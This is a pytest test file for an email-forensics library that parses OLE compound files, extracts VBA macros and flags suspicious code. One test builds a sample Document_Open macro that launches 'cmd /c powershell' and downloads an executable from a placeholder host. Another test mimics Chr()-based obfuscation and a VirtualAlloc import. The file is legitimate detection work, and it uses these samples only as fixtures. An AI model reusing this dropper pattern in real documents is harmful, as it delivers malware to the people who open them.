import os
from pathlib import Path

import pytest

from cfbwriter import build_cfb, build_vba_project, vba_compress
from email_forensics.cfb import CfbError, CompoundFile, open_cfb
from email_forensics.vba import VbaError, analyze_source, decompress, extract_vba

REAL = Path(__file__).parent / "fixtures" / "vba" / "xlsxwriter_vbaProject.bin"


def test_reads_real_excel_project():
    cf = CompoundFile(REAL.read_bytes())
    names = sorted("/".join(e.path) for e in cf.streams())
    assert "VBA/dir" in names and "VBA/Module1" in names and len(names) == 13
    modules = {m.name: m for m in extract_vba(cf)}
    assert set(modules) == {"ThisWorkbook", "Sheet1", "Sheet2", "Module1", "ThisWorkbook1"}
    assert 'MsgBox ("Hello from Python!")' in modules["Module1"].preview
    assert modules["Module1"].autoexec == [] and not modules["Module1"].stomped


def test_writer_round_trip_big_and_mini_streams():
    streams = {"small": b"x" * 100, "big": os.urandom(10_000), "A/B/deep": b"d" * 200, "empty": b""}
    cf = CompoundFile(build_cfb(streams))
    for path, data in streams.items():
        assert cf.read_path(*path.split("/")) == data
    assert cf.find("a", "b", "DEEP") is not None  # case-insensitive lookup
    assert cf.read_path("missing") is None


def test_olefile_agrees_with_writer():
    olefile = pytest.importorskip("olefile")
    streams = {"x": os.urandom(5000), "S/y": b"y" * 50}
    ole = olefile.OleFileIO(build_cfb(streams))
    assert all(ole.openstream(p).read() == v for p, v in streams.items())


@pytest.mark.parametrize("data", [b"", b"not ole", b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 600,
                                  b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\xff" * 2000])
def test_garbage_is_rejected(data):
    assert open_cfb(data) is None
    with pytest.raises((CfbError, ValueError)):
        CompoundFile(data)


def test_fat_loop_is_detected():
    raw = bytearray(build_cfb({"big": b"z" * 6000}))
    cf = CompoundFile(bytes(raw))
    entry = cf.find("big")
    # Point the stream's second sector back at its first.
    fat_off = 512
    first = entry.start
    raw[fat_off + (first + 1) * 4: fat_off + (first + 2) * 4] = first.to_bytes(4, "little")
    with pytest.raises(CfbError):
        CompoundFile(bytes(raw)).read(CompoundFile(bytes(raw)).find("big"))


def test_vba_decompress():
    text = b"Sub AutoOpen()\r\n" * 400
    assert decompress(vba_compress(text)) == text
    with pytest.raises(VbaError):
        decompress(b"\x02junk")


def test_synthetic_project_and_keywords():
    code = 'Sub Document_Open()\r\nShell "cmd /c powershell"\r\nURLDownloadToFile 0, "http://x.test/a.exe", "a.exe", 0, 0\r\nEnd Sub\r\n'
    cf = CompoundFile(build_cfb(build_vba_project({"Module1": code})))
    [mod] = extract_vba(cf)
    assert mod.autoexec == ["Document_Open"]
    kinds = " ".join(mod.suspicious)
    assert "runs a program" in kinds and "downloads" in kinds and "living-off-the-land" in kinds
    assert "http://x.test/a.exe" in mod.iocs


def test_analyze_source_obfuscation_and_api():
    auto, sus, _ = analyze_source(
        'Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" () As LongPtr\n'
        "x = Chr(80) & Chr(111) & Chr(119) & Chr(101) & Chr(114) & Chr(83)\n")
    joined = " ".join(sus)
    assert "Windows API" in joined and "memory" in joined and "character by character" in joined
    assert auto == []


def test_corrupt_module_stream_does_not_abort_extraction():
    raw = bytearray(build_cfb(build_vba_project({"Module1": "Sub A()\r\nEnd Sub\r\n" * 300})))
    cf = CompoundFile(bytes(raw))
    entry = cf.find("VBA", "Module1")
    # Break the module's sector chain with a self-loop.
    fat_off = 512
    raw[fat_off + entry.start * 4: fat_off + entry.start * 4 + 4] = entry.start.to_bytes(4, "little")
    modules = extract_vba(CompoundFile(bytes(raw)))
    assert [m.name for m in modules] == ["Module1"] and modules[0].code_bytes == 0
